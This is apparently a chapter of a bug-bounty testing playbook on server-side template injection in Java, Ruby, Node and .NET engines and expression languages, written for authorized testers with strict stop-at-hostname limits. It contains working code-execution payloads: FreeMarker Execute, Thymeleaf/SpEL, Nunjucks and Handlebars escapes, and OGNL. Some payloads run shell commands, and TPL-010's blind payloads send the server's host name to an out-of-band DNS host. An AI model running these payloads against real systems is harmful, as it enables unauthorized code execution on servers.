  functions it was not given. `system() has been disabled for security reasons` (`disable_functions`): the
  function list is closed for this route; say so and stop rather than hunting for an unlisted function. The
  markers enclose the payload as typed.
- **Escalate:** stop at the host name. A Twig sandbox or Smarty policy that holds on current releases is not a
  finding; one in a version with a published escape (Smarty before 3.1.39 and 3.1.42, Twig before 2.14.11 and
  3.3.8 for the sandboxed `sort` filter) is the CVE chapter's, proven with the advisory's harmless form.

### TPL-007 · A FreeMarker, Velocity, Groovy or Thymeleaf expression we control reaches Java classes and the server's host name comes back

| | |
|---|---|
| **Severity** | Critical standalone when a Java call returns the host name; none when the class resolver or the uberspector refuses every class and only `${.version}` prints |
| **Requires** | java, reflect\|api\|email-out\|render\|template-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #822002, #1490372, #399462 |

- **Where:** the evaluation point where TPL-002 named FreeMarker, Velocity, Groovy templates, Thymeleaf, Pebble or
  JinJava, and Spring MVC pages whose view name is built from input: a `lang`, `section`, `view`, `tab` or
  `fragment` parameter or path segment that selects the page (`return "user/" + section`). Thymeleaf evaluates
  `__${...}__` inside a view name that contains `::`. #822002 was Velocity in Apache Solr (a CVE: the Solr case
  itself is CVE-011's), #399462 template injection in HubSpot's CMS.
- **Test:** FreeMarker's `?new` instantiates `freemarker.template.utility.Execute` unless the class resolver
  forbids it. Velocity calls static methods through a `Class` object, so `"".class.forName(...)` reaches
  `InetAddress` without a process. Groovy imports `java.net` by default. Thymeleaf evaluates SpEL, whose `T()`
  names any class.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-007"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q; S=()
  pr() { curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "$P=tpl007a$2tpl007b" "$U" -o "$D/$1.body"; sleep "$W"
         printf '%-9s %s\n' "$1" "$(grep -aoE 'tpl007a.{0,300}tpl007b' "$D/$1.body" | head -1)"; }
  # FreeMarker: version and data-model keys (no code), then the Execute utility (one hostname process)
  pr fm-ver  '${.version}'; pr fm-keys '${.data_model?keys?join(",")}'
  pr fm-host '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("hostname")}'
  # Velocity: a static call through a Class object, no process
  pr vm-host '#set($x="")$x.class.forName("java.net.InetAddress").getLocalHost().getHostName()'
  # Groovy templates (SimpleTemplateEngine, GSP)
  pr gv-host '${InetAddress.localHost.hostName}'
  # Thymeleaf with Spring: an inlined expression in template text, then preprocessing inside an attribute
  pr th-host '[[${T(java.net.InetAddress).getLocalHost().getHostName()}]]'
  pr th-pre  '__${T(java.net.InetAddress).getLocalHost().getHostName()}__'
  # Spring view name from a parameter or a path segment
  V='__${T(java.net.InetAddress).getLocalHost().getHostName()}__::.x'
  curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "lang=$V" "$T/" -o "$D/view-param.body" -w '%{http_code}\n'; sleep "$W"
  curl -sS "${HDR[@]}" "${S[@]}" "$T/doc/$(printf %s "$V" | jq -sRr @uri)" -o "$D/view-path.body" -w '%{http_code}\n'
  grep -aoE 'Error resolving template[^<"]{0,120}|View name is an executable expression[^<"]{0,80}' "$D"/view-*.body
  ```
  A view-name hit shows the host name inside `Error resolving template [...]` only where the error page prints
  messages; Spring Boot 2.3 and later hide them by default, and then TPL-010's Thymeleaf row is the proof. Pebble
  and JinJava: `{{"a".getClass()}}` printing `class java.lang.String` shows an old release that does not block
  `getClass`; current ones refuse it, which is a negative.
- **Proof:** the host name between the markers (or in the template-resolution error), with TPL-001's `1337` from
  the same point and the engine's version where it prints, saved raw.
- **Not a finding when:** FreeMarker answers `Instantiating freemarker.template.utility.Execute is not allowed in
  the template for security reasons` (a safer class resolver) and `?api` is disabled: the template reaches only
  its data model, so report nothing unless the keys hold data the page does not show. Velocity prints the
  reference text unevaluated (a secure uberspector). Thymeleaf answers `View name is an executable expression,
  and it is present in a literal manner in request path or parameters, which is forbidden for security reasons`:
  3.0.12 and later refuse the view-name form. `#{...}` returned as `??..._en_US??` is a missing message, not
  evaluation. The Solr, Confluence or Struts product CVEs belong to CVE-011.
- **Escalate:** stop at the host name. If the programme asks for the user, `${ex("id")}` or
  `$x.class.forName("java.lang.System").getProperty("user.name")` once. Never `env`, never a file beyond
  `/etc/hostname`, never `Runtime.exec` with a shell.

### TPL-008 · An ERB, Slim, EJS, Pug, Nunjucks, Handlebars or Razor expression we control reaches the runtime and the server's host name comes back

| | |
|---|---|
| **Severity** | Critical standalone when the runtime returns the host name; none for logic-less engines (Mustache, Handlebars 4.6 and later with default options) where only the documented helpers work |
| **Requires** | ruby\|node\|dotnet, reflect\|api\|email-out\|render\|template-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #423541, #942103, #3897236, #3122019 |

- **Where:** the evaluation point where TPL-002 named a Ruby engine (ERB through `render inline:` or `ERB.new`,
  Slim, Haml), a Node engine (EJS, lodash or underscore `_.template`, Pug, Nunjucks, Handlebars, doT, a Velocity
  port) or Razor compiled at run time (RazorEngine, RazorLight). #423541 was Handlebars in a Shopify app's e-mail
  templates, #942103 a Rails test server, #3897236 a JavaScript Velocity implementation reached through the
  prototype chain, #3122019 EJS through `@fastify/view`'s raw option.
- **Test:** ERB, Slim, Haml, EJS, lodash and Pug compile our text into code of the host language, so a library
  call returns the host name directly. Nunjucks reaches the `Function` constructor through any function's
  `constructor`. Handlebars reaches it only through prototype properties, which releases from 4.6.0 on deny by
  default. Razor compiles C#: `System.Environment.MachineName` needs no process.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-008"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q; S=()
  pr() { curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "$P=tpl008a$2tpl008b" "$U" -o "$D/$1.body"; sleep "$W"
         printf '%-9s %s\n' "$1" "$(grep -aoE 'tpl008a.{0,300}tpl008b' "$D/$1.body" | head -1)"; }
  # Ruby: ERB, then Slim or Haml interpolation
  pr erb-host  '<%= require "socket"; Socket.gethostname %>'
  pr slim-host '#{require "socket"; Socket.gethostname}'
  # Node, CommonJS (an ESM application has no process.mainModule: use process.getBuiltinModule("os") on Node 20.16+)
  pr ejs-host  '<%= process.mainModule.require("os").hostname() %>'      # EJS, lodash, underscore
  pr pug-host  '#{process.mainModule.require("os").hostname()}'
  pr njk-host  '{{range.constructor("return process.mainModule.require(\"os\").hostname()")()}}'
  pr dot-host  '{{=process.mainModule.require("os").hostname()}}'
  pr vjs-host  '#set($s="")$s.constructor.constructor("return process.mainModule.require(\"os\").hostname()").call()'
  pr hb-host   '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require(\"os\").hostname();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
  # .NET: Razor, no process
  pr rz-host   '@System.Environment.MachineName'
  ```
  The Handlebars chain is the published one with the command replaced by `os.hostname()`; it works only on
  releases from before the 2019 fixes (4.0.14 and 4.1.2, then 4.3.0 and 4.5.3 closed later escapes). On 4.6.0 and
  later it renders an empty string and the server logs `Access has been denied to resolve the property`. If the
  programme asks for the user: Node `os.userInfo().username`, Ruby `Process.uid`, .NET
  `System.Environment.UserName`, once.
- **Proof:** the host name between the markers, next to TPL-001's `1337` and TPL-002's distinguishing output from
  the same point, saved raw.
- **Not a finding when:** Mustache prints empty strings and Handlebars returns nothing for the chain: logic-less
  and prototype-restricted engines leave only their data, which TPL-004's context listing measures. The template
  was compiled in the browser (EJS, lodash or Handlebars in a bundle): the raw response holds the template
  unrendered, so it is client side. `TypeError: Cannot read properties of undefined (reading 'require')` means ESM
  or a worker without `mainModule`, not a patched engine: repeat with `process.getBuiltinModule("os")`. Razor's
  `@` returned as typed: the view was compiled at build time and our text is only data.
- **Escalate:** stop at the host name. A library-level bug (lodash `_.template`, #904672; Handlebars crash,
  #726364) is reportable to a web programme only through its application passing our text as template source,
  which is what this card shows.

### TPL-009 · A value we send is evaluated as a Java expression (SpEL, OGNL, Jakarta EL, MVEL) outside any template: `191*7` comes back as `1337` and a static call returns the host name

| | |
|---|---|
| **Severity** | Critical standalone when a static call returns the host name; High when bean or property references read configuration outside the request; none for arithmetic in a rule field documented as an expression language |
| **Requires** | java, params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-917 |
| **Prior art** | #896298, #917455, #1175842, #894870 |

- **Where:** Java features that turn a value into an expression. Rule, condition, filter, routing and scoring
  fields in workflow, automation, alerting and pricing features (SpEL is Spring's default for these; MVEL in Drools
  and MVEL-based rule engines; JEXL in Apache tools). Validation errors that repeat the rejected value: a Bean
  Validation constraint that builds its message from the value with `buildConstraintViolationWithTemplate`
  interpolates `${...}` as Jakarta EL. JSF and JSP pages that put a value into an EL-evaluated attribute, and
  Struts 2 tag attributes that force OGNL with `%{...}`. The four GitHub Security Lab queries cited (SpEL, OGNL,
  Jakarta EL, MVEL) describe exactly these sinks.
- **Test:** arithmetic in each delimiter (`${}` EL, `#{}` SpEL templates and deferred EL, `%{}` OGNL) inside a
  longer value, and as a bare expression for fields that take one. Where a form computes, the language's own
  static-call syntax returns the host name: SpEL `T(...)`, OGNL `@class@method()`, EL through reflection, MVEL
  by fully qualified name.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-009"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/api/automations/validate"; F=condition; S=()   # an expression field, or a JSON field whose validation error repeats the value
  ev() { curl -sS "${HDR[@]}" "${S[@]}" -X POST "$U" -H 'Content-Type: application/json' \
           -d "$(jq -nc --arg k "$F" --arg v "$2" '{($k):$v}')" -o "$D/$1.body"; sleep "$W"
         printf '%-10s %s\n' "$1" "$(grep -aoE 'tpl009a.{0,200}tpl009b|EL1[0-9]{3}E[^"]{0,80}|(ognl|javax?\.el|jakarta\.el|mvel)[^"]{0,80}' "$D/$1.body" | head -2 | tr '\n' ' ')"; }
  # 1. delimited forms inside a longer value, and a bare expression
  ev base 'tpl009axtpl009b'; ev el 'tpl009a${191*7}tpl009b'; ev hash 'tpl009a#{191*7}tpl009b'; ev ognl 'tpl009a%{191*7}tpl009b'
  ev bare "'tpl009a'+(191*7)+'tpl009b'"
  # 2. the host name, in the form that computed
  ev spel-host 'tpl009a#{T(java.net.InetAddress).getLocalHost().getHostName()}tpl009b'
  ev spel-bare "'tpl009a'+T(java.net.InetAddress).getLocalHost().getHostName()+'tpl009b'"
  ev ognl-host 'tpl009a%{@java.net.InetAddress@getLocalHost().getHostName()}tpl009b'
  ev el-host   'tpl009a${"".getClass().forName("java.net.InetAddress").getMethod("getLocalHost").invoke(null).getHostName()}tpl009b'
  ev mvel-bare "'tpl009a'+java.net.InetAddress.getLocalHost().getHostName()+'tpl009b'"
  ```
  The EL form needs EL 3.0 (Tomcat 8 and later, Jakarta EL), which calls varargs methods such as `getMethod`. For
  a SpEL field where `T()` is refused but bean references work, `#{@environment.getProperty('spring.application.name')}`
  is the configuration read: the application name, never a datasource password.
- **Proof:** `tpl009a1337tpl009b` and then the host name between the markers from the same field, saved raw, with
  the request that shows which form computed.
- **Not a finding when:** the field is documented as SpEL, MVEL or JEXL and arithmetic works while `T()`, `@...@`
  and `getClass()` are refused: `SimpleEvaluationContext` (`EL1005E: Type cannot be found`), JEXL's restricted
  permissions and OGNL member-access rules hold, and arithmetic is the feature. Hibernate Validator 6.2 and later
  return `${191*7}` as typed in custom violation messages (expression language limited by default). The value
  comes back with `${` intact. Known-product OGNL and SpEL CVEs (Confluence CVE-2021-26084, #1327769; Struts
  S2-045, #1070532; Spring Cloud Function routing expressions) are CVE-011 and CVE-016, not this card.
- **Escalate:** stop at the host name. No output in any response (the expression is evaluated in a background job):
  TPL-010's SpEL, EL and OGNL rows.

### TPL-010 · An input whose rendering we never see is evaluated by a template engine: the server resolves a callback name that the engine computed from `191*7` and its own host name

| | |
|---|---|
| **Severity** | Critical standalone: only code running in the engine can make the server resolve a name it computed, and the host-name label shows where it ran |
| **Requires** | params, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #125980, #164224, #536130 |

- **Where:** values that are rendered where we cannot look: e-mails and notifications sent to staff or to other
  users, support-ticket and feedback forms, background PDF and report jobs whose output we cannot download,
  names and descriptions that an admin dashboard renders, error handlers that format the value into a template
  for a log or an alert, and TPL-007's Spring view names when the error page hides messages. No disclosed report
  in the library names an out-of-band channel; the cited ones are template injection that reached the operating
  system, which is what a lookup with the host name proves.
- **Test:** for each engine, one payload whose evaluation calls a DNS resolution function on a name it builds from
  `191*7` and the server's host name, with the engine's name in the label. A scanner, WAF or mail filter that
  resolves names it reads cannot produce `1337` from the text `191*7`, and cannot know the host name: the label
  says which engine ran and where.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-010"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/api/feedback"; P=message; S=()   # a field whose rendering we never see; S=($A) behind a login
  date -u +%FT%TZ | tee -a "$D/sent-at.txt"
  while read -r n v; do v=${v//OOB/$OOB}
    curl -sS "${HDR[@]}" "${S[@]}" -X POST "$U" --data-urlencode "$P=$v" -o /dev/null -w "%{http_code} $n\n"; sleep "$W"
  done <<'EOF' | tee -a "$D/sent.txt"
  control tpl010-ctl.OOB
  jinja2 {{lipsum.__globals__.__builtins__.__import__('socket').gethostbyname(lipsum.__globals__.os.uname().nodename~'.tpl010-'~(191*7)~'-jinja2.OOB')}}
  mako ${__import__('socket').gethostbyname(__import__('socket').gethostname()+'.tpl010-'+str(191*7)+'-mako.OOB')}
  tornado {% import socket %}{{socket.gethostbyname(socket.gethostname()+'.tpl010-'+str(191*7)+'-tornado.OOB')}}
  twig {{['getent hosts $(hostname).tpl010-$((191*7))-twig.OOB || nslookup $(hostname).tpl010-$((191*7))-twig.OOB']|filter('system')|join}}
  smarty {system('getent hosts $(hostname).tpl010-$((191*7))-smarty.OOB || nslookup $(hostname).tpl010-$((191*7))-smarty.OOB')}
  freemarker <#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup "+ex("hostname")?trim+".tpl010-"+(191*7)?c+"-fm.OOB")}
  freemarker2 <#assign ex="freemarker.template.utility.Execute"?new()>${ex("getent hosts "+ex("hostname")?trim+".tpl010-"+(191*7)?c+"-fm2.OOB")}
  velocity #set($x="")#set($n=191*7)#set($c=$x.class.forName("java.net.InetAddress"))#set($h=$c.getLocalHost().getHostName())$c.getByName("${h}.tpl010-${n}-vm.OOB")
  thymeleaf [[${T(java.net.InetAddress).getByName(T(java.net.InetAddress).getLocalHost().getHostName()+'.tpl010-'+(191*7)+'-th.OOB')}]]
  thview __${T(java.net.InetAddress).getByName(T(java.net.InetAddress).getLocalHost().getHostName()+'.tpl010-'+(191*7)+'-thv.OOB')}__::.x
  spel #{T(java.net.InetAddress).getByName(T(java.net.InetAddress).getLocalHost().getHostName()+'.tpl010-'+(191*7)+'-spel.OOB')}
  ognl %{@java.net.InetAddress@getByName(@java.net.InetAddress@getLocalHost().getHostName()+".tpl010-"+(191*7)+"-ognl.OOB")}
  el ${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke(null,"tpl010-"+=(191*7)+="-el.OOB")}
  erb <%= require 'socket'; Socket.getaddrinfo(Socket.gethostname+'.tpl010-'+(191*7).to_s+'-erb.OOB', nil).size %>
  slim #{require 'socket'; Socket.getaddrinfo(Socket.gethostname+'.tpl010-'+(191*7).to_s+'-slim.OOB', nil).size}
  ejs <%= process.mainModule.require('dns').lookup(process.mainModule.require('os').hostname()+'.tpl010-'+(191*7)+'-ejs.OOB',function(){}) %>
  pug #{process.mainModule.require('dns').lookup(process.mainModule.require('os').hostname()+'.tpl010-'+(191*7)+'-pug.OOB',function(){})}
  nunjucks {{range.constructor("return process.mainModule.require('dns').lookup(process.mainModule.require('os').hostname()+'.tpl010-'+(191*7)+'-njk.OOB',function(){})")()}}
  razor @(System.Net.Dns.GetHostAddresses(System.Environment.MachineName+".tpl010-"+(191*7)+"-razor.OOB").Length)
  EOF
  ```
  Send only the rows the language tag allows (a Java asset needs nine, a Python one three). For a JSON field put
  `-H 'Content-Type: application/json' -d "$(jq -nc --arg v "$v" '{message:$v}')"` in place of
  `--data-urlencode`. Rendering is often queued: wait for the job (the next digest, the staff view) before calling
  a row negative. A host name longer than 63 characters breaks its label; FreeMarker's `Execute` runs without a
  shell, which is why it has a `getent` row of its own.
- **Proof:** the DNS query for `<host name>.tpl010-1337-<engine>.$OOB` (`tpl010-1337-el` for the EL row, which
  has no host name) in the interactsh log, from a resolver in the target's address space, after the time in
  `sent-at.txt`, with the request that carried that row saved raw. The label names the engine, `1337` shows it
  computed, the host name shows where.
- **Not a finding when:** the query carries `191*7`, `$((191*7))` or other payload text instead of `1337`, or the
  control `tpl010-ctl` resolves alone: something read the string without evaluating it. The query arrives hours
  later from a mail or URL scanner or a security vendor's network (`third-party`). The host name belongs to a
  preview or sandbox service the product sells for running templates.
- **Escalate:** the engine named by the label gives the language card; use it when any channel shows output.
  Otherwise the lookup with the host name is the report, as RCE-002's. One more lookup with the user name in place
  of the host name if the programme asks, then stop.

## Graveyard

- **Client-side template injection.** `{{7*7}}` computed by AngularJS or Vue in the browser, while the raw response
  holds the literal: XSS (XSS-001's AngularJS row), and `self-xss` when it fires only in our own session. #125027,
  #217790, #230234 and #792847 were filed as XSS.
- **Arithmetic without a read.** "`{{7*7}}` returns 49, may lead to RCE" gets "please demonstrate impact" at best.
  In a sandboxed or logic-less engine (Liquid, Mustache, Handlebars 4.6 and later, Jinja2's `SandboxedEnvironment`,
  Twig's sandbox) it is the feature. Park it and run TPL-002 and the language card.
- **Template errors and engine names.** A stack trace naming Jinja2 or FreeMarker, a 500 on `{{`, a version string:
  `version-disclosure`. A value that breaks a template so that a page or an e-mail fails is self-DoS: #1265344,
  template injection in a reset e-mail field, closed informative (`dos`).
- **Template editing as the feature.** An administrator editing a theme, an e-mail template or a script that runs
  code by design: the RCE chapter's "code execution by the role that owns it". Only a lower role (RCE-012,
  #2332551) or an escape from a hosted, multi-tenant sandbox (TPL-004) counts.
- **Vendor-rendered templates.** Merge tags and Handlebars rendered by the e-mail service (SendGrid dynamic
  templates, Mailchimp, Postmark) run on the vendor's systems (`third-party`).
- **Library advisories without a deployment.** "lodash `_.template` evaluates code" (#904672, informative) and
  Handlebars parser crashes (#726364) are library reports; a web programme needs an application of its own that
  passes our text as template source.
- **Known-product expression-language CVEs.** OGNL in Confluence (CVE-2021-26084: #1327769, #1327701) and Struts
  (S2-045: #1070532), Velocity in Solr (#822002) and Spring Cloud routing expressions are CVE-011 and CVE-016, and
  `known-cve` where the policy excludes CVEs within its patch window. They are not repeated here.
- **Scanner output.** tplmap or SSTImap "confirmed" without the manual read (`automated`); their shell modes are
  never part of a proof.
- **Proofs that overreach.** A reverse shell, `config.SECRET_KEY` or `os.environ` printed in full, `.env` read, a
  template written to disk or a second command after the host name: these break most policies and the report never
  needed them.

## Chains

- TPL-003 and TPL-004 → SSR-007: a template whose HTML reaches a server-side PDF renderer also loads internal URLs
  (#1115139, a packing-slip template to internal Kubernetes endpoints).
- TPL-004 → BAC-011 and RCE-012: a lower role that can edit templates (#417839, #423198) turns any escape into
  privilege escalation; TPL-004's lookups by id aimed at B's objects → BAC-001 across tenants.
- RCE-010 and LFI-007 (a file written into a template directory), LFI-001 (a template-name parameter that loads a
  file we uploaded) → TPL-002: the engine compiles our file, and the language card proves it.
- TPL-005 → INF and DSR: a reachable Flask or Django secret key is described, never used. Forging session cookies
  with it is the deserialization and session chapters' question, answered on paper.
- TPL-001 with HTML escaping off → XSS: report the template injection once, as the higher severity.
- TPL-007 and TPL-009 ↔ CVE-011 and CVE-016: the same OGNL and SpEL sinks in known products, by CVE number.
- TPL-010 ↔ RCE-002: the same proof standard, a DNS lookup carrying the host name.

## Sources

- `kb/reports/ssti.md` and `kb/reports/all/ssti.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"SSTI"}`, `find_bypasses {"protection":"template sandbox"}`, `find_payloads {"topic":"Server Side Template Injection"}`.
- PortSwigger Web Security Academy, Server-side template injection; James Kettle, "Server-Side Template Injection:
  RCE for the modern web app" (2015); OWASP WSTG-INPV-18; PayloadsAllTheThings, Server Side Template Injection.
- Engine documentation for the controls this chapter tests: Jinja2 `SandboxedEnvironment`, the Twig sandbox
  extension, Smarty security policies, FreeMarker `new_builtin_class_resolver` and `api_builtin_enabled`, Velocity
  `SecureUberspector`, Handlebars runtime options for prototype access, Spring `SimpleEvaluationContext`, Hibernate
  Validator's expression language feature level, Thymeleaf's restricted expression mode.
